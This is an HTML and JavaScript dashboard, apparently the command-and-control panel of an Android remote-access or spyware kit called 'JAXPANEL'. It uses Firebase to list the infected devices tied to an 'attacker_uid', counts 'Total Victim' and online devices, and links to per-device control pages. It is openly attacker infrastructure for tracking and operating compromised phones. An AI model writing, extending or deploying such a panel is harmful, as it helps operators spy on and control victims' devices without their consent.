<!DOCTYPE html>
<html>
<head>
    <title>📊 Dashboard</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script>
        const firebaseConfig = { /* SAMA KAYAK DI ATAS */ };
        firebase.initializeApp(firebaseConfig);
    </script>
    <style>
        body { background: #0a0e2a; color: white; font-family: 'Courier New'; margin: 0; padding: 20px; }
        .navbar { display: flex; justify-content: space-between; background: #151e3d; padding: 10px 20px; border-bottom: 2px solid #00ffaa; }
        .content { margin-top: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .card { background: #151e3d; border: 1px solid #00aaff; padding: 15px; border-radius: 5px; }
        .device-list { background: #1e2745; padding: 10px; margin: 5px 0; cursor: pointer; border-left: 3px solid #00ffaa; }
        .device-list:hover { background: #2a3460; }
    </style>
</head>
<body>
    <div class="navbar">
        <h2>⚡ JAXPANEL [REU EDITION]</h2>
        <div><span id="userEmail"></span> | <a href="profile.html" style="color:#00ffaa;">Profile</a> | <a href="#" onclick="logout()" style="color:red;">Logout</a></div>
    </div>
    <div class="content">
        <div class="card">
            <h3>📱 DEVICE ONLINE</h3>
            <div id="deviceList">Loading...</div>
        </div>
        <div class="card">
            <h3>📊 QUICK STATS</h3>
            <p>Total Victim: <span id="totalCount">0</span></p>
            <p>Online: <span id="onlineCount">0</span></p>
            <p>Last Update: <span id="lastUpdate">-</span></p>
        </div>
    </div>
    <script>
        const uid = firebase.auth().currentUser?.uid;
        document.getElementById('userEmail').innerText = firebase.auth().currentUser?.email;
        
        // Ambil devices yang attacker_uid = uid user
        const devicesRef = firebase.database().ref('devices');
        devicesRef.orderByChild('attacker_uid').equalTo(uid).on('value', snap => {
            let html = '';
            snap.forEach(child => {
                const data = child.val();
                html += `<div class="device-list" onclick="window.location.href='device.html?id=${child.key}'">
                    📟 ${data.deviceName || 'Unknown'} | ${data.model || '-'} | ${data.online ? '🟢' : '🔴'}
                </div>`;
            });
            document.getElementById('deviceList').innerHTML = html || 'Belum ada victim';
        });

        function logout() { firebase.auth().signOut().then(() => { window.location.href = 'index.html'; }); }
    </script>
</body>
</html>
